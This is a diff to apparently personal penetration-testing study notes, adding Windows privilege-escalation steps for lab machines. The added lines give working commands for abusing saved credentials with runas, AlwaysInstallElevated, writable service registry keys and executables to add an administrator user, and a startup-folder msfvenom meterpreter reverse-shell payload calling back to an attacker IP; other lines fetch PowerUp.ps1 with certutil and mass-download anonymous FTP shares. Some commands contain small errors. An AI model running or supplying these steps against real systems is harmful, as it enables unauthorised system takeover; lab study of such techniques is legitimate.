@@ -228,6 +228,8 @@ use the following website for the rainbow table attack
 -----------------------------------------------------------------Windows Privilege Escalation TCM---------------------------------------------------------------------
 - https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources
 - https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html
+F (full access) |  M (modify access) | RX (read & execute access) | R (read-only access) | W (write-only access)
+
 Windows Enumeration:
 - system enum
 -     systeminfo
@@ -342,7 +344,56 @@ cd to the share
 5- Get System
 
 6- RunAs
+-     cmdkey /list
+if you find Target: Domain:interactive=Access\Administrator Type: Domain Password User: Access\Administrator
+use RunAs command to get the flag
+-     C:\Windows\System32\runas.exe /user:Access\Administrator /savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt > C:\Users\raman\root.txt"
 
+7- Always Install Elevated
+run powerup and check if the AlwaysInstallElevated is there or not. if yes you can run the command that is in the powerup to add a new user to the administrator group (it will generate a program to add the user)
+you also can check AlwaysInstallElevated from the cmd. if the AlwaysInstallElevated has a value of 0x1 means it's on
+-     reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+-     reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+then run the program that powerup generated to create a backdoor user and set the user to the administrator group
+another option is to use meterpreter to elevate your session
+-     exploit/windows/local/always_install_elevated
+
+8- abusing service registry
+to check if you have access to the registry service 
+-     powershell -ep bypass
+-     Get-Acl -Path hkln:\System\CurrentControlSet\service\regsvc | fl
+if you have FullControl in the Access for your user (might be NT AUTHORITY\INTERACTIVE ALLOW). you can let the service run a reverse shell or add a user to the administrator group
+now you need to download a file from windows to kali. use ftp server to do that
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
+head to C:\Tools\Source and connect to kali ftp server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
+edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
+-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
+move the compiled c file to windows then run it using
+-     reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc  /v ImagePath /t REG_EXPAND_SZ /d c:\temp\raman.exe /f
+-     sc start regsvc
+net localgroup administrator
+
+9- Executable Files (you need to use windows_service.c from Point #8 (above))
+run powerup and check service executables
+you also can check executable services from the cmd command
+-     C:\Users\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"     (executable service)
+now you need to download a file from windows to kali. use ftp server to do that
+-     python -m pyftpdlib -p 21 --write    (pip3 install pyftpdlib  #to download it) (kali)
+head to C:\Tools\Source and connect to kali ftp server, anonymous login, then put the windows_service.c file
+-     ftp 10.10.16.4 | username:anonymous | put windows_service.c
+edit the windows_service file and replace the system("whoami > ..") with system("cmd.exe /k net localgroup administrator user /add"). DON'T FORGET TO COMPILE THE C FILE
+-     w64-mingw32-gcc windows_service.c -o raman.exe     (sudo apt install gcc-mingw-w64)
+move the compiled c file to windows (replace it with c:\ProgramFiles\FilePermissionsService) then run it using
+-     sc start FilePermService
+net localgroup administrator
+
+10- Startup Applications
+check if you have write access to the startup application. if yes use msfvenom to get a meterpreter session
+-     icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" (BUILTIN\Users:(F)) //F means you have full access
+save the below payload in the c:\ProgramData\Microsoft\StartMenu\Programs\Startup and start-up multihandler
+-     msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.3 LPORT=4444 -f exe -o raman.exe
+then you need to wait for the administrator to login then you will get a shell
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 Platforms
 1. for Initial Access work on eJPT, This article and official content 
@@ -378,9 +429,10 @@ There is username and password on this you can upload shell on direcotyr or find
 check if anonymous allowed then use ftp anonymous@ip  (password also anonymous)
 there is some mod if ls dir not work then apply use passive (to go in active mod).
 -     ·mget * (# Download everything from current directory like zip, pdf, doc)
+-     wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 (# Download everything from ftp server)
 send/put (# Send single file or upload shell command)
 after download files always use exiftool –u -a <filename> (Meta description for users)
-good practise if you can switch to binary (ASCII is defual)
+good practise if you can switch to binary (ASCII is default)
 ·FTP version above 3.0 not exploitable
 
 Port 22 SSH:
@@ -588,7 +640,7 @@ F> Full access | M> Modify access |RX> Read and execute access| R>Read-only acce
 Powerup
 -     certutil.exe -urlcache -split -f http://192.168.10.10/PowerUp.ps1
 powershell -ep bypass
--     .\PowerUp.ps1
+-     . .\PowerUp.ps1
 Invoke-AllChecks (check all possible vulnerability except plaintext passwd)
 Winpeas.exe (all including plaintext passwd)
 Windpeas.exe If .net 4.5 (run otherwise)
